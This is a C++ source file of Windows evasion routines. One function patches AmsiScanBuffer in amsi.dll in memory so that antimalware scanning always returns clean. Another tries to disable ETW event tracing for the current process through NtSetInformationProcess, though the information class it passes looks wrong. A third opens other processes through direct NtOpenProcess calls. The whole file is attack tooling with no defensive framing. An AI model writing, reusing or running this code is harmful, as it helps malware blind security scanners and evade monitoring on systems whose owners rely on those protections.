#include "bypass.h"
#include <cstdio>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// typedef enum _SYSTEM_INFORMATION_CLASS {
//     SystemCodeIntegrityInformation = 103
// } SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* fnNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

void BypassAmsiViaPatch() {

    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");

    if (!pAmsiScanBuffer) return;
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    memcpy(pAmsiScanBuffer, patch, 3);
    VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
    printf("[+] AMSI bypassed via patch.\n");
}

void DisableEtw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtSetInformationProcess = (fnNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    if (!NtSetInformationProcess) return;
    ULONG flags = 0x40; // PROCESS_TRACE_FLAGS_DISABLE_ALL
    NTSTATUS status = NtSetInformationProcess(GetCurrentProcess(), 0x40, &flags, sizeof(flags));
    if (status == 0) printf("[+] ETW disabled.\n");
    else printf("[-] ETW disable failed (status 0x%08lX)\n", status);
}

HANDLE SysOpenProcess(DWORD pid, DWORD access) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    if (!NtOpenProcess) return NULL;
    HANDLE hProcess = NULL;
    CLIENT_ID cid = { (HANDLE)pid, NULL };
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    NTSTATUS status = NtOpenProcess(&hProcess, access, &oa, &cid);
    if (status != 0) return NULL;
    return hProcess;
}